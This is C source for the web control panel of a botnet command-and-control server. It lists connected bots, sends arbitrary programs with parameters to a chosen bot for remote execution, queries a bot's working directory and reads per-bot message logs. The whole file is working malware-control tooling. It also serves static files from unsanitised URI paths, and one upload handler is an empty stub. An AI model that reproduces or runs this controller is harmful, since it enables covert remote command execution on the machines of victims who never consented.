#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdbool.h>
#include "../lib/cJSON.h"
#include "../lib/mongoose.h"
#include "../include/server/hash_table.h"
#include "../include/commands.h"
#include "../include/logging.h"
#include "../include/web_server.h"
#include "../include/server/server_constants.h"
#include "../include/send_message.h"
#include "../include/receive_message.h"

// Access global table for web implementation :)
extern ClientHashTable hash_table;

static const char *static_dir = "../static"; // Website files
volatile bool stop_server = false; // Define the stop_server flag

// Function to serve static files
static void serve_static_file(struct mg_connection *c, struct mg_http_message *hm) {
    char path[512];
    const char *uri = hm->uri.buf;
    size_t uri_len = hm->uri.len;

    // Uri has static (8 first bytes), to be removed to get actual uri
    if (strncmp(uri, "/static/", 8) == 0) {
        uri += 8; // Skip the "/static/" prefix
        uri_len -= 8;
    }

    // get filepath
    snprintf(path, sizeof(path), "%s/%.*s", static_dir, (int)uri_len, uri);
    output_log("Attempting to serve file: %s\n", LOG_DEBUG, LOG_TO_ALL, path);

    // The file requested does not exist
    struct stat st;
    if (stat(path, &st) != 0 || S_ISDIR(st.st_mode)) {
        output_log("File not found: %s\n", LOG_ERROR, LOG_TO_ALL, path);
        mg_http_reply(c, 404, "", "File not found\n");
        return;
    }

    // return file
    struct mg_http_serve_opts opts = {.root_dir = static_dir};
    mg_http_serve_file(c, hm, path, &opts);
}

// Function to list all bots
void handle_list_bots(struct mg_connection *c, struct mg_http_message *hm) {
    char response[4096] = "[";
    bool first = true;

    for (size_t i = 0; i < hash_table.size; i++) {
        Client *client = hash_table.table[i];
        while (client != NULL) {
            if (!first) strcat(response, ",");
            char client_info[256];
            snprintf(client_info, sizeof(client_info),
                     "{\"id\":\"%s\",\"socket\":\"%d\",\"status\":\"%s\"}",
                     client->id,
                     client->socket,
                     client->state == LISTENING ? "listening" :
                     client->state == ACTIVE ? "active" : "unreachable");
            strcat(response, client_info);
            first = false;
            client = client->next;
        }
    }

    strcat(response, "]");
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response);
}

void handle_send_upload(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0}; // Declare bot_id
    char cmd_id[64] = {0};
    char program[256] = {0};
    char params[256] = {0};
    int delay = 0;
    int expected_code = 0;
    char delay_str[16] = {0};
    char expected_code_str[16] = {0};
}

// Function to handle sending a command to a client
void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0}; // Declare bot_id
    char cmd_id[64] = {0};
    char program[256] = {0};
    char params[256] = {0};
    int delay = 0;
    int expected_code = 0;
    char delay_str[16] = {0};
    char expected_code_str[16] = {0};


    // Parse fields from the POST request
    mg_http_get_var(&hm->body, "bot_id", bot_id, sizeof(bot_id)); // Parse bot_id
    mg_http_get_var(&hm->body, "cmd_id", cmd_id, sizeof(cmd_id));
    mg_http_get_var(&hm->body, "program", program, sizeof(program));
    mg_http_get_var(&hm->body, "params", params, sizeof(params));
    mg_http_get_var(&hm->body, "delay", delay_str, sizeof(delay_str));
    mg_http_get_var(&hm->body, "expected_code", expected_code_str, sizeof(expected_code_str));

    // Parse integers
    delay = strlen(delay_str) > 0 ? atoi(delay_str) : 0;
    expected_code = strlen(expected_code_str) > 0 ? atoi(expected_code_str) : 0;

    // Validate required fields
    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    if (strlen(program) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Program is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Build the Command struct
    Command cmd = {
        .cmd_id = "",
        .delay = delay,
        .program = strdup(program),
        .expected_exit_code = expected_code,
        .params = NULL // Initialize params to NULL
    };
    strncpy(cmd.cmd_id, cmd_id, sizeof(cmd.cmd_id) - 1);

    // Parse params into a null-terminated array
    if (strlen(params) > 0) {
        char *param_token = strtok(params, " ");
        size_t param_count = 0;

        while (param_token != NULL) {
            cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
            cmd.params[param_count] = strdup(param_token);
            param_count++;
            param_token = strtok(NULL, " ");
        }

        // Null-terminate the params array
        cmd.params = realloc(cmd.params, (param_count + 1) * sizeof(char *));
        cmd.params[param_count] = NULL;
    }

    output_log("Got Bot ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);
    output_log("Got CMD ID : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.cmd_id);
    output_log("Got program : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.program);
    char buffer[1024] = {0};
    size_t offset = 0;

    if (cmd.params != NULL) {
        for (size_t i = 0; cmd.params[i] != NULL; i++) {
            offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s ", cmd.params[i]);
        }
    }
    output_log("Got params : %s\n", LOG_DEBUG, LOG_TO_CONSOLE, buffer);
    output_log("Got delay : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, cmd.delay);
    output_log("Got expected code : %d\n", LOG_DEBUG, LOG_TO_CONSOLE, expected_code);

    // Write to log
    char log_message[1024] = {0};
    snprintf(log_message, sizeof(log_message), 
            "Server : Executing command (%s) (%s) with delay (%d), code (%d)", 
            cmd.program, 
            buffer, // Params
            cmd.delay, 
            cmd.expected_exit_code);
    write_to_client_log(client, log_message);

    // Send the command to the client
    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
    free_command(&cmd); // Free dynamically allocated fields
}

// Function to handle server status
void handle_server_status(
    struct mg_connection *c,
    struct mg_http_message *hm,
    int (*socket_func)(int, int, int),
    int (*connect_func)(int, const struct sockaddr *, socklen_t),
    void (*reply_func)(struct mg_connection *, int, const char *, const char *, ...)
) {
    const char *botnet_server_ip = DEFAULT_SERVER_ADDR;
    int botnet_server_port = atoi(DEFAULT_SERVER_PORT);
    const char *web_server_ip = DEFAULT_WEB_ADDR;
    int web_server_port = atoi(DEFAULT_WEB_PORT);

    // is botnet server active? (attempt connection)
    bool botnet_server_active = false;
    int botnet_socket = socket_func(AF_INET, SOCK_STREAM, 0);
    if (botnet_socket >= 0) {
        struct sockaddr_in botnet_addr;
        botnet_addr.sin_family = AF_INET;
        botnet_addr.sin_port = htons(botnet_server_port);
        inet_pton(AF_INET, botnet_server_ip, &botnet_addr.sin_addr);

        if (connect_func(botnet_socket, (struct sockaddr *)&botnet_addr, sizeof(botnet_addr)) == 0) {
            botnet_server_active = true;
        }
        close(botnet_socket);
    }

    // Is web server active (attempt connection)?
    bool web_server_active = false;
    struct mg_mgr mgr;
    mg_mgr_init(&mgr);
    char addr[64];
    snprintf(addr, sizeof(addr), "http://%s:%d", web_server_ip, web_server_port); // Construct web addr of web server
    struct mg_connection *web_conn = mg_http_connect(&mgr, addr, NULL, NULL);
    if (web_conn != NULL) {
        web_server_active = true;
    }
    mg_mgr_free(&mgr); // We no longer need manager

    int connected_clients = 0;
    int unreachable_clients = 0;

    for (size_t i = 0; i < hash_table.size; i++) {
        // Which clients are connected, or inactive
        Client *client = hash_table.table[i];
        while (client != NULL) {
            if (client->state == ACTIVE || client->state == LISTENING) {
                connected_clients++;
            } else if (client->state == UNREACHABLE) {
                unreachable_clients++;
            }
            client = client->next;
        }
    }

    // create response
    char response[512];
    snprintf(response, sizeof(response),
             "{"
             "\"botnet_server_active\": %s,"
             "\"botnet_server_ip\": \"%s\","
             "\"botnet_server_port\": %d,"
             "\"web_server_active\": %s,"
             "\"web_server_ip\": \"%s\","
             "\"web_server_port\": %d,"
             "\"connected_clients\": %d,"
             "\"unreachable_clients\": %d"
             "}",
             botnet_server_active ? "true" : "false",
             botnet_server_ip,
             botnet_server_port,
             web_server_active ? "true" : "false",
             web_server_ip,
             web_server_port,
             connected_clients,
             unreachable_clients);


    // Send resp
    reply_func(c, 200, "Content-Type: application/json\r\n", "%s", response);
}

void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256];
    mg_http_get_var(&hm->query, "id", bot_id, sizeof(bot_id)); // bot ID requested
    char lines_param[16], offset_param[16];
    mg_http_get_var(&hm->query, "lines", lines_param, sizeof(lines_param)); // Number of lines to fetch
    mg_http_get_var(&hm->query, "offset", offset_param, sizeof(offset_param)); // Offset (from end)

    if (strlen(bot_id) == 0) { // Missing bot id
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    // Bot exists?
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Get the file path for bot msg file ({client_id}_messages.txt)
    char filepath[512];
    snprintf(filepath, sizeof(filepath), "client_messages/%s_messages.txt", bot_id);

    // File exists there ?
    struct stat st;
    if (stat(filepath, &st) != 0) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"File not found\"}");
        return;
    }

    // Parse the number of lines and offset
    int lines = (strlen(lines_param) > 0) ? atoi(lines_param) : 50; // Default to last 50 lines
    int offset = (strlen(offset_param) > 0) ? atoi(offset_param) : 0;

    // Open the file and read the last n lines given
    FILE *file = fopen(filepath, "r");
    if (file == NULL) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to open file\"}");
        return;
    }

    // Allocate memory for the lines
    char **lines_buffer = calloc(lines + offset, sizeof(char *));
    if (lines_buffer == NULL) {
        fclose(file);
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
        return;
    }

    int total_lines = 0, start_line = 0;
    size_t len = 0;
    char *line = NULL;

    // Read the file
    while (getline(&line, &len, file) != -1) {
        if (total_lines >= lines + offset) {
            if (lines_buffer[start_line] != NULL) {
                free(lines_buffer[start_line]); // Free the oldest line
            }
        }
        lines_buffer[start_line] = strdup(line); // Store the new line
        start_line = (start_line + 1) % (lines + offset);
        total_lines++;
    }
    free(line);
    fclose(file);

    // Construct offset range
    int start = (total_lines > lines + offset) ? total_lines - lines - offset : 0;
    int end = (total_lines > offset) ? total_lines - offset : 0;

    // Dynamically allocate the response buffer
    size_t response_size = 8192; // Start with 8 KB response size
    char *response = malloc(response_size); // use malloc, not a char buffer. OVERFLOW DANGER OTHERWISE
    if (response == NULL) {
        free(lines_buffer);
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
        return;
    }
    response[0] = '\0'; // Initialize the response buffer

    // Construct the response
    for (int i = start; i < end; i++) {
        int index = i % (lines + offset);
        if (lines_buffer[index] != NULL) {
            size_t line_length = strlen(lines_buffer[index]);
            size_t current_length = strlen(response);

            // Is buffer too small??
            if (current_length + line_length + 1 >= response_size) {
                response_size *= 2; // Increase buffer size -> Prevent buffer overflow if return file is "huge"
                char *new_response = realloc(response, response_size);
                if (new_response == NULL) {
                    free(response);
                    free(lines_buffer);
                    mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Memory allocation failed\"}");
                    return;
                }
                response = new_response;
            }

            // Append the line to the response
            strncat(response, lines_buffer[index], response_size - current_length - 1);
            free(lines_buffer[index]); // Free the line after using it
        }
    }
    free(lines_buffer);

    // Send the response
    mg_http_reply(c, 200, "Content-Type: text/plain\r\n", "%s", response);
    free(response);
}

void handle_get_cwd(struct mg_connection *c, struct mg_http_message *hm) {
    char bot_id[256] = {0};

    // Parse the bot_id from the request
    mg_http_get_var(&hm->query, "bot_id", bot_id, sizeof(bot_id));

    output_log("Getting cwd from bot %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);

    if (strlen(bot_id) == 0) {
        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
        return;
    }

    // Find the target client
    Client *client = find_client(&hash_table, bot_id);
    if (client == NULL) {
        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
        return;
    }

    // Build the `pwd` command
    Command cmd = {
        .cmd_id = "0",
        .delay = 0,
        .program = strdup("pwd"), // Dynamically allocate program
        .expected_exit_code = 0,
        .params = NULL // Initialize params to NULL
    };

    // Send the command to the client
    output_log("Command built, client found - sending!\n", LOG_DEBUG, LOG_TO_CONSOLE);

    if (send_command(client->socket, &cmd) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    // Receive the response from the client
    char buffer[1024] = {0};
    if (receive_message_client(client->socket, buffer, sizeof(buffer), recv) < 0) {
        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to receive response from client\"}");
        output_log("Failed receiving reply from client\n", LOG_DEBUG, LOG_TO_CONSOLE);
        free_command(&cmd); // Free dynamically allocated fields
        return;
    }

    // Use cJSON to create the JSON response
    cJSON *response_json = cJSON_CreateObject();
    cJSON_AddStringToObject(response_json, "cwd", buffer);

    // Convert the JSON object to a string
    const char *response_str = cJSON_PrintUnformatted(response_json);

    // Send the JSON response
    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);

    // Free resources
    cJSON_Delete(response_json);
    free((void *)response_str);
    free_command(&cmd); // Free dynamically allocated fields

    output_log("CWD sent back to the server!\n", LOG_DEBUG, LOG_TO_CONSOLE);
}

// HTTP request handler
void handle_request(struct mg_connection *c, int ev, void *ev_data) {
    struct mg_http_message *hm = (struct mg_http_message *) ev_data;
    if (ev == MG_EV_HTTP_MSG) {
        if (strncmp(hm->uri.buf, "/api/bots", hm->uri.len) == 0) {
            handle_list_bots(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/upload", hm->uri.len) == 0) {
            handle_send_upload(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
            handle_send_command(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
            handle_server_status(c, hm, socket, connect, mg_http_reply);
        } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
            handle_get_bot_file(c, hm);
        } else if (strncmp(hm->uri.buf, "/api/cwd", hm->uri.len) == 0) {
            handle_get_cwd(c, hm);
        } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
            serve_static_file(c, hm);
        } else {
            mg_http_reply(c, 404, "", "Not Found\n");
        }
    }
}

// Start web interface
void *start_web_interface(void *arg) {
    struct mg_mgr mgr;
    mg_mgr_init(&mgr);

    // Set up the server
    struct mg_connection *c = mg_http_listen(&mgr, DEFAULT_WEB_ADDR ":" DEFAULT_WEB_PORT, handle_request, NULL);
    if (c == NULL) {
        output_log("Cannot start web server on %s:%s\n", LOG_ERROR, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);
        return NULL;
    }

    output_log("Web server started on %s:%s\n", LOG_INFO, LOG_TO_ALL, DEFAULT_WEB_ADDR, DEFAULT_WEB_PORT);

    // Main server loop
    while (!stop_server) {
        mg_mgr_poll(&mgr, 100); // Poll for events (100 ms timeout)
    }

    mg_mgr_free(&mgr); // Free resources
    return NULL;
}
